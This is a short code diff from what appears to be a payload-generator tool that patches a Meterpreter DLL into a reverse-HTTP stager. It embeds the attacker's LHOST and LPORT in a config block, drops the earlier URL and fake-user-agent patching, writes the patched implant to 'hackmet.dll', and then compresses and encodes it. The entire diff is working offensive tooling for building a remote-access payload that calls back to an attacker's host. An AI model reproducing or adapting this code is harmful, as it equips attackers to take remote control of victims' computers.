@@ -42,15 +42,13 @@ class Payload:
         # get the main meterpreter .dll with the header/loader patched
         meterpreterDll = patch.headerPatch()
 
-        # turn off SSL
-        meterpreterDll = patch.patchTransport(meterpreterDll, False)
+        # insert config block
+        meterpreterDll = patch.http_config_block(meterpreterDll, self.required_options['LHOST'][0], self.required_options['LPORT'][0])
 
-        # replace the URL
-        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + helpers.genHTTPChecksum() + "/\x00"
-        meterpreterDll = patch.patchURL(meterpreterDll, urlString)
 
-        # replace in the UA
-        meterpreterDll = patch.patchUA(meterpreterDll, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00")
+        f = open('hackmet.dll', 'wb')
+        f.write(meterpreterDll)
+        f.close()
 
         # compress/base64 encode the dll
         compressedDll = helpers.deflate(meterpreterDll)
